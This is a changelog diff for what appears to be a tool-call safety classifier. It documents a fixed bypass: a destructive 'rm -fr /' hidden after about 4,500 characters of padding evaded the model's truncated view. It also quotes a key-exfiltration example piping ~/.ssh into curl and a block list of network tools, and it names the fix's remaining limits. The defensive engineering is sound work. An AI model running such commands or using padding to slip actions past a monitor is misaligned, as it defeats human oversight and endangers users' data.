@@ -14,6 +14,15 @@ All notable changes to this project are documented here. Versions follow
 - `secrets-leak` now blocks key material (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`,
   `.netrc`, `.git-credentials`, `id_rsa`, `id_ed25519`) piped into `curl`, `wget`,
   `nc`, `ncat`, `netcat` or `socat`, e.g. `tar czf - ~/.ssh | curl -T - URL`.
+- The model only ever saw the first 4,000 characters of a tool call (`text[:4000]`),
+  so a dangerous command placed after a long harmless preamble was never judged:
+  `rm -fr /` after ~4,500 characters of comments went from `block` (0.84) to
+  `review` (0.44), and `review` passes through in most adapters. Input is now split
+  into 4,000-character windows (lines kept whole, long lines cut with a 200-character
+  overlap) and every window is judged; the worst verdict wins. Past 6 windows the
+  middle is skipped (first windows + last one are kept) and an `allow` becomes
+  `review`. Regexes were already applied to the whole text; inputs over 256K
+  characters or with a line over 16K are still blocked unread.
 
 ### Added
 
